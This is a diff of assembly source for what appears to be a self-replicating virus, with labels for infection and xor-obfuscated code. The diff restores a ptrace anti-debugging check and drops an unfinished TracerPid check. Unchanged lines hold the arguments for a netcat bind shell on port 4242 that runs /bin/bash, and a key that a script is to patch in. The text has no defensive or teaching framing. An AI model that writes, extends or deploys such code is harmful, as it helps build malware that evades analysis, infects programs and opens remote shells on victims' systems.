@@ -83,40 +83,13 @@ can_run_infection:
 ; result of xor between the two following blocks
 .begin_mixed_code:
 .begin_anti_debugging:
-;	mov rax, SYS_PTRACE				; _ret = ptrace(
-;	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
-;	xor rsi, rsi					; 	0,
-;	xor rdx, rdx					; 	0
-;	syscall						; );
-;	cmp rax, 0					; if (_ret < 0)
-;	jl .debugged					; 	goto .debugged;
-
-	%push context
-	%stacksize flat64
-	%assign %$localsize 0
-
-	%local i_buf:qword					; long i_buf;
-	%local i_needle:qword					; long i_needle;
-	%xdefine buf rbp - %$localsize - CHECK_TRACE_BUF_SIZE	; uint8_t buf[CHECK_TRACE_BUF_SIZE]
-	%assign %$localsize %$localsize + CHECK_TRACE_BUF_SIZE	; ...
-
-	push rbp
-	mov rbp, rsp
-	sub rsp, %$localsize
-
-	mov rax, SYS_OPEN				; open(
-	lea rdi, [rel proc_status_file]			; proc_status_file,
-	mov rsi, O_RDONLY				; O_RDONLY,
-	xor rdx, rdx					; 0
+	mov rax, SYS_PTRACE				; _ret = ptrace(
+	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
+	xor rsi, rsi					; 	0,
+	xor rdx, rdx					; 	0
 	syscall						; );
-	cmp rax, 0; TMP TODO CHECK FOR ERROR
-
-	mov rax, SYS_READ
-
-	add rsp, %$localsize
-	pop rbp
-	%pop
-
+	cmp rax, 0					; if (_ret < 0)
+	jl .debugged					; 	goto .debugged;
 
 	call check_process				; _ret = check_process();
 	cmp rax, 1					; if (_ret == !)
@@ -496,8 +469,6 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-proc_status_file: db "/proc/self/status", 0
-traced_proc_cmp: "TracerPid:", 0x09, "0", 0x0A
 magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
